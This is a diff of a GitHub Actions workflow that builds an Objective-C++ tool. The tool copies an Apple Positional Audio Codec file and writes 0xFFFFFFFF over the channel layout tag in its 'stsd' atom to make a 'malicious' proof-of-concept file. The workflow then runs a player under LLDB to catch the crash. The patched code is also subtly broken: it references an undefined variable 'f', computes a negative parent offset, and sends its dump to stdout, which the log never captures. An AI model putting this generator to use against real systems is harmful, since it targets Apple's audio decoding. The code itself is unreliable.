@@ -19,11 +19,11 @@ jobs:
       - name: Navigate to working directory
         run: cd AppleTest2/apple-positional-audio-codec-invalid-header-main && ls -l
 
-      # Updated: This script now recursively parses the MOV to find the exact offset to corrupt.
-      - name: Patch encodeme.mm to Surgically Corrupt the APAC File
+      # Updated: This script now also dumps the MOV file's atom structure for debugging.
+      - name: Patch encodeme.mm to Dump and Corrupt the APAC File
         working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
         run: |
-          echo "Patching encodeme.mm with a recursive parser to surgically corrupt the APAC file..."
+          echo "Patching encodeme.mm with recursive parser and dumper..."
           cat > encodeme.mm << 'EOF'
           #import <Foundation/Foundation.h>
           #include <stdio.h>
@@ -36,6 +36,30 @@ jobs:
               if (fread(bytes, 1, 4, f) != 4) return 0;
               return ((uint32_t)bytes[0] << 24) | ((uint32_t)bytes[1] << 16) | ((uint32_t)bytes[2] << 8) | bytes[3];
           }
+          
+          // New: Recursive function to dump the entire atom structure
+          void dump_atoms(FILE *f, int depth, long parent_size) {
+              long parent_start = ftell(f) - 8; // Adjust for atom header already read
+
+              while (ftell(f) < parent_start + parent_size) {
+                  long atom_start = ftell(f);
+                  uint32_t atom_size = read_uint32_be(f);
+                  char name[5] = {0};
+                  if (fread(name, 1, 4, f) != 4) break;
+
+                  for (int i = 0; i < depth; i++) printf("  ");
+                  printf("Atom: '%s', Size: %u, Offset: 0x%lx\n", name, atom_size, atom_start);
+
+                  // These are known container atoms, so we recurse into them
+                  if (strcmp(name, "moov") == 0 || strcmp(name, "trak") == 0 || strcmp(name, "mdia") == 0 || strcmp(name, "minf") == 0 || strcmp(name, "stbl") == 0) {
+                      dump_atoms(f, depth + 1, atom_size);
+                  }
+
+                  if (atom_size == 0) break;
+                  fseek(f, atom_start + atom_size, SEEK_SET);
+              }
+          }
+
 
           // Recursive helper function to find a nested atom
           long find_atom_recursive(FILE *f, const char *atom_path) {
@@ -49,10 +73,10 @@ jobs:
                   strncpy(target_atom, atom_path, 4);
               }
 
-              long current_offset = ftell(f);
+              long parent_start = ftell(f);
               fseek(f, 0, SEEK_END);
               long file_size = ftell(f);
-              fseek(f, 0, SEEK_SET);
+              fseek(f, parent_start, SEEK_SET);
 
               while (ftell(f) < file_size) {
                   long atom_start = ftell(f);
@@ -69,6 +93,8 @@ jobs:
                           return atom_start;
                       }
                   }
+                  
+                  if (atom_size == 0) break;
                   fseek(f, atom_start + atom_size, SEEK_SET);
               }
               return -1;
@@ -91,14 +117,23 @@ jobs:
                   }
                   fprintf(stderr, "Successfully copied base APAC file.\n");
 
-                  // Step 2: Open the file and find the 'stsd' atom to corrupt.
+                  // Step 2: Open the file to dump and then corrupt.
                   FILE *file = fopen(pocName, "r+b");
                   if (!file) {
                       fprintf(stderr, "Failed to re-open file for corruption.\n");
                       return 1;
                   }
                   
-                  // This path represents the nested structure to find the sample description.
+                  // Step 2a: Dump the atom structure for debugging
+                  fprintf(stderr, "--- Atom Structure Dump ---\n");
+                  fseek(file, 0, SEEK_END);
+                  long file_size = ftell(f);
+                  fseek(file, 0, SEEK_SET);
+                  dump_atoms(file, 0, file_size);
+                  fprintf(stderr, "--- End Atom Structure Dump ---\n");
+                  
+                  // Step 2b: Find the 'stsd' atom to corrupt.
+                  fseek(file, 0, SEEK_SET); // Reset file pointer before searching
                   long stsd_offset = find_atom_recursive(file, "moov/trak/mdia/minf/stbl/stsd");
                   
                   if (stsd_offset == -1) {
@@ -108,12 +143,11 @@ jobs:
                   }
                   fprintf(stderr, "Found 'stsd' atom at offset: 0x%lx\n", stsd_offset);
 
-                  // PoC: Corrupt the channel layout tag inside the 'stsd' atom.
-                  // The exact offset inside the 'stsd' atom can vary, but it's typically around +72 bytes for the audio track.
+                  // Step 3: Corrupt the channel layout tag
                   long corruption_offset = stsd_offset + 72;
                   fseek(file, corruption_offset, SEEK_SET);
                   
-                  unsigned char malicious_tag[4] = {0xFF, 0xFF, 0xFF, 0xFF}; // Invalid layout tag
+                  unsigned char malicious_tag[4] = {0xFF, 0xFF, 0xFF, 0xFF};
                   fwrite(malicious_tag, 1, sizeof(malicious_tag), file);
                   fclose(file);
 
@@ -139,13 +173,16 @@ jobs:
           clang++ -g -fobjc-arc -framework Foundation -framework AudioToolbox encodeme.mm -o encodeme_corruptor
           if [ $? -ne 0 ]; then echo "Compilation failed."; exit 1; fi
 
-      # This step now just runs the corruption utility.
-      - name: Corrupt APAC File
+      # This step now dumps the atom structure and corrupts the file.
+      - name: Dump and Corrupt APAC File
         working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
         run: |
-          ./encodeme_corruptor
+          # Redirect stderr to a log file to capture the atom dump
+          ./encodeme_corruptor 2> atom_dump.txt
           echo "Malicious APAC PoC file generated."
           ls -l output_apac_poc.m4a
+          echo "--- Atom Dump Log ---"
+          cat atom_dump.txt
           
       # Launch the player directly under LLDB to catch any startup crashes.
       - name: Launch Player Under LLDB to Catch Crash
@@ -178,5 +215,6 @@ jobs:
           path: |
             AppleTest2/apple-positional-audio-codec-invalid-header-main/output_apac_poc.m4a
             AppleTest2/apple-positional-audio-codec-invalid-header-main/player_debug_log.txt
+            AppleTest2/apple-positional-audio-codec-invalid-header-main/atom_dump.txt
           retention-days: 7
           if-no-files-found: error
